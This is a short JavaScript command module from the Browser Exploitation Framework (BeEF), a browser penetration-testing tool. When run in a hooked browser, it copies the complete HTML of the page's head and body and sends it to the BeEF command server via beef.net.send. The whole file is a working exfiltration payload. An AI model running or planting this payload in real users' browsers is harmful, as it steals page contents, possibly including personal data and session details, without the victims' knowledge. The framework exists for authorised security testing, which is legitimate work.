//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	try {
		var html_head = document.head.innerHTML.toString();
	} catch (e) {
		var html_head = "Error: document has no head";
	}
	try {
		var html_body = document.body.innerHTML.toString();
	} catch (e) {
		var html_body = "Error: document has no body";
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head+'&body='+html_body);

});

